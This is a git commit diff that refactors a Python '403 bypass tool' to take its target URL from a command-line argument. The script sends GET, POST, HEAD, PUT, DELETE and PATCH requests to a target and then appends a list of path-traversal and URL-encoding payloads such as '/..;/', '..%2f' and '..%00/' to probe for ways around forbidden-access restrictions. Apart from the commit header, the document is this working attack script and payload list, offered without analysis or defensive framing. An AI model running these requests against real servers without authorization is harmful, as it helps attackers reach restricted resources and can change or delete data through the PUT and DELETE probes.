c5ab8df4e0ec2e6e166f1768d686e8d061ad0cf1
Barathkumarjk <85182726+BarathkumarJK@users.noreply.github.com>
2023-07-28 14:16:39 +0530

    Update 403_bypass.py

--- 403_bypass.py
+++ 403_bypass.py
@@ -1,39 +1,48 @@
+import argparse
 import pyfiglet
 import requests
 
-banner = pyfiglet.figlet_format("403 bypass tool")
-print(banner)
+def main():
+    parser = argparse.ArgumentParser(description="403 Bypass Tool")
+    parser.add_argument("-u", "--url", help="Target URL for testing", required=True)
+    args = parser.parse_args()
 
-url = input("Enter the URL: ")
+    banner = pyfiglet.figlet_format("403 bypass tool")
+    print(banner)
 
-# different methods code
+    url = args.url
 
-req1 = requests.get(url, allow_redirects=False)
-print("using GET     method : " + str(req1.status_code))
+    # different methods code
+    req1 = requests.get(url, allow_redirects=False)
+    print("using GET     method : " + str(req1.status_code))
 
-req2 = requests.post(url, allow_redirects=False)
-print("using POST    method : " + str(req2.status_code))
+    req2 = requests.post(url, allow_redirects=False)
+    print("using POST    method : " + str(req2.status_code))
 
-req3 = requests.head(url, allow_redirects=False)
-print("using HEAD    method : " + str(req3.status_code))
+    req3 = requests.head(url, allow_redirects=False)
+    print("using HEAD    method : " + str(req3.status_code))
 
-req4 = requests.put(url, allow_redirects=False)
-print("using PUT     method : " + str(req4.status_code))
+    req4 = requests.put(url, allow_redirects=False)
+    print("using PUT     method : " + str(req4.status_code))
 
-req5 = requests.delete(url, allow_redirects=False)
-print("using DELETE  method : " + str(req5.status_code))
+    req5 = requests.delete(url, allow_redirects=False)
+    print("using DELETE  method : " + str(req5.status_code))
 
-req6 = requests.patch(url, allow_redirects=False)
-print("using PATCH   method : " + str(req6.status_code))
+    req6 = requests.patch(url, allow_redirects=False)
+    print("using PATCH   method : " + str(req6.status_code))
 
-print("--------------------   Methods completed     ---------------------\n")
+    print("--------------------   Methods completed     ---------------------\n")
 
-#using payloads
-print("---------------- Using payload of URL started ----------------------")
+    # using payloads
+    print("---------------- Using payload of URL started ----------------------")
 
-pays = ["/","/*","/%2f/","/./","./.","/*/","?","??","&","#","%","%20","%09","/..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23"]
+    pays = ["/", "/*", "/%2f/", "/./", "./.", "/*/", "?", "??", "&", "#", "%", "%20", "%09", "/..;/", "../",
+            "..%2f", "..;/", ".././", "..%00/", "..%0d", "..%5c", "..%ff/", "%2e%2e%2f", ".%2e/", "%3f", "%26", "%23"]
 
-for payloads in pays:
-     url2 = url + payloads
-     req7 = requests.get(url2, allow_redirects=False)
-     print(url2 + " : " + str(req7.status_code))
+    for payloads in pays:
+        url2 = url + payloads
+        req7 = requests.get(url2, allow_redirects=False)
+        print(url2 + " : " + str(req7.status_code))
+
+if __name__ == "__main__":
+    main()
